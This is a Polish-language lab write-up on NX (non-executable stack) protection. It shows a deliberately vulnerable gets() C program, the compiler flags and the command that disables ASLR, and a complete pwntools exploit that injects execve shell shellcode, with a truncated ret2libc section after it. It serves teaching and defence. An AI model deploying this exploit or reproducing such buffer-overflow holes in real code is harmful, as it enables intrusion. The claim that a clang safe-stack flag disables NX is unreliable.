# Executable space protection

## 1. Opis 

`Executable space protection`, w bezpieczeństwie systemów i oprogramowania, odnosi się do oznaczania regionów pamięci jako `niewykonywalen` - `non-executable`. W wyniku takiego oznaczenia wykonywanie kodu maszynowego z regionu tak oznaczonego zakończy się wzniesieniem wyjątku. 



Oznacza to, że w przypadku ataków BOF, podczas których najczęściej wstrzykujemy kod na stos, który następnie chcemy wykonać jest niemożliwe. Przykład takiego exploitu zadenmonstruję w kolejnych punktach.

## 2. Wady i zalety

NX jest jedną z wielu sposobów zapobiegania przed atakami typu BOF. Nie jest to jednak metoda, która całkowicie zapobiega takim atakom - można powiedzieć że żadna technika nie jest w stanie w 100% zapewnić bezpieczeństwo aplikacji. 

Wykorzystywanie samej metody NX w zabezpieczeniu aplikacji powinno być jedna z wielu metod. NX zapobiega przed wykonaniem kodu maszynowego ze stosu, jednakże należy pamiętać, że i NX da sie ominąć. Przykładem jest atak typu `ret2libc`. Celem takiego ataku nie jest wstrzyknięcie i wykonanie złośliwego kodu, a wywołanie funkcji bibliotecznych podczas wychodzenia z funkcji, wktorej nastąpiło przepełnienie - więcej o tym ataku w kolejnych punktach.

Można więc stwierdzić, że NX jest dobrym sposobem ochorony aplikacji działającej w trybie uzytkownika, jednakże należy wiedzieć, że nie zapewnie on całkowitej ochrony.


## 3. Porównanie metody w przypadku `gcc` i `clang`

W przypadku użycia najnowszego `gcc` metoda NX jest defaultowo włączona. Istnieje jednak możliwość wyłączenia tej metody poprzez dodanie odpowiedniej flagi podczas kompilacji, a mianowicie `-z execstack`.

W przypadku użycia kompilatora `clang` metoda NX jest również defaultowo włączona. Równiez isnitje możliwosć wyłączenia tej metody, poprzez flagę `-fsanitize=safe-stack`.

## 4. Porównanie metody w Linux vs Windows




## 5.1 Przykładowa aplikacji - atack `shellcode injection`


Przyjęte założenia:

* kompilacja na 32-bit = `-m32`
* ASLR - wyłączone = `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
* Wyłączone NX = `-z execstack`
* Wyłączone Stack Cannary = `-fno-stack-protector`



Kodpodatnej aplikacji. Podatność znajduje się w funkcji `vuln`, w której wywołujemy funkcję `gets()` - nie sprawdza ile bitów podajemy do zapisania i potrafi zapisać bity nawet poza długością przeznaczonego do tego buffora. 

```
//gcc vuln.c -o vuln -m32 -fno-stack-protector -no-pie -z execstack

#include <stdio.h>
#include <string.h>

void vuln(){
	char buffer[16];
	gets(buffer);
	printf("Buffer = %p", buffer);
}

int main(int argc, char *argv[])
{
	vuln();
	return 0;
}
```

Aby dokonać exploitacji takiego programu należy wstrzyknąć kod, który chcemy wykonać na stos, a następnie nadpisać adres powrotu w funkcji `vuln()` na adres naszego kodu. Zatem eksploitację można podzielić na następujące punkty:

* znaleźć padding, który należy zastosować aby nadpisać `eip`
* podać adres wstrzykniętego kodu
* wstrzyknąć odpowiedni shellcode

Aby odnaleźć odpowiedni padding, można posłużyć się patternem `AAAABBBBCCCCDDDDEEEE...`. Dzięki takiemu inputowi w łatwy sposób w `gdb` można sprawdzić jaki adres został nadpisany na rejestr 	`eip`. W przypadku tej aplikacji jest to `HHHH`, zatem padding to `AAAABBBBCCCCDDDDEEEEFFFFGGGG`. 

![](pictures/1_padding.png)

Następnym krokiem jest odnalezienie adresu `buffer`. Adres jest stały, ponieważ ASLR został wyłączony. Adres uzyskuję przez `printf()`. Alternatywnie można to zrobić, poprzez użycie `gdb` i sprawdzenie adresu na stosie. Poniżej widać, że adres buffora to `0xffffd180`.

![](pictures/1_buffer_addres.png)

Shellcode można pobrać ze strony [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-752.php). W Moim przypadku używam shellcodu w postaci ASM, napisany dla architektury x86.

```asm
xor ecx, ecx
mul ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov al, 11
int 0x80
```


Ostatnim elementem potrzebnym do udanej eksploitacji to policzenie odpowiedniego adresu, na który należy wskazać, aby shellcode wykonał się. Do adresu buffora należy dodać długośc paddingu oraz długość adresu `eip`, dzięki temu wyliczony adres bedzie wskazywać na shellcode.

```python
padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"

buf_ptr = 0xffffd1d0

eip = buf_ptr + len(padding) + 4
```

Finalny exploit wygląda następująco:


```python
#!/usr/bin/env python3

from pwn import *

padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"

buf_ptr = 0xffffd1d0

eip = buf_ptr + len(padding) + 4

shellcode = """
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
 """

send = padding + p32(eip) + asm(shellcode)

p = process('./vuln')
p.sendline(send)
p.interactive()
```





W wyniku działania exploitu otrzymujemy shella. 

![](pictures/1_shell.png)



Dla aplikacji z włączonym zabezpieczeniem exploit nie działa. Dostajemy sygnał `SIGSEGV` - próba dostępu do zabronionej pamieci.

![](pictures/1_protected.png)





## 5.2 Przykładowa aplikacji - atak `ret2libc`

Tak jak wspomniałem w `wady i zalety`, pomimo właczonej ochorny `NX`, dlaej istnieje moźliwość exploitacji aplikacji - poprzez atak `ret2libc`. W tym ataku, zamiast wykonywać shellcode ze strosu, wykorzystamy funkcje biblioteczne z bibioteki `libc`.

Przyjęte założenia:

* kompilacja na 32-bit = `-m32`
*   ASLR - wyłączone = `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
*   Włączone NX
*   Wyłączone Stack Cannary = `-fno-stack-protector`

Kod podatnej aplikacji. Tak jak w poprzedniej wersji, podatnością jest `gets()`. Zmienione zostały jedynie flagi kompilacji.

```c
//gcc vuln-protected.c -o vuln-protected -m32 -fno-stack-protector -no-pie

#include <stdio.h>
#include <string.h>

void vuln(){
        char buffer[16];
        gets(buffer);
        printf("Buffer = %p", buffer);
}

int main(int argc, char *argv[])
{
        vuln();
        return 0;
}
```
Padding został odnaleziony w taki sam sposób





